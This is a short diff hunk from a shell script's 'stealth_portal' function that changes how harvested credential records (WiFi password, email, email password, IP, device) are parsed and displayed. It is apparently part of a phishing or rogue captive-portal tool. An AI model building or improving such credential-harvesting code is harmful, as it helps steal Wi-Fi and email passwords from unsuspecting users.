@@ -2103,9 +2103,9 @@ stealth_portal() {
                 time=$(echo "$cred_data" | grep -o '[0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}T[0-9:\-]*' | head -1)
                 ip=$(echo "$cred_data" | grep -o 'IP: [^ ]*' | cut -d' ' -f2)
                 device=$(echo "$cred_data" | grep -o 'Device: [^ ]*' | cut -d' ' -f2)
-                wifi_pass=$(echo "$cred_data" | grep -o 'WiFi: [^ ]*' | cut -d' ' -f2)
-                email=$(echo "$cred_data" | grep -o 'Email: [^ ]*' | cut -d' ' -f2)
-                email_pass=$(echo "$cred_data" | grep -o 'Pass: [^ ]*' | cut -d' ' -f2)
+                wifi_pass=$(echo "$cred_data" | sed -n 's/.*WiFi: \([^-]*\).*/\1/p' | xargs)
+                email=$(echo "$cred_data" | sed -n 's/.*Email: \([^-]*\).*/\1/p' | xargs)
+                email_pass=$(echo "$cred_data" | sed -n 's/.*Pass: \(.*\)/\1/p' | xargs)
                 
                 echo -e "${WHITE}$(get_str 71):${NC} $time"
                 echo -e "${WHITE}$(get_str 72):${NC} $ip"
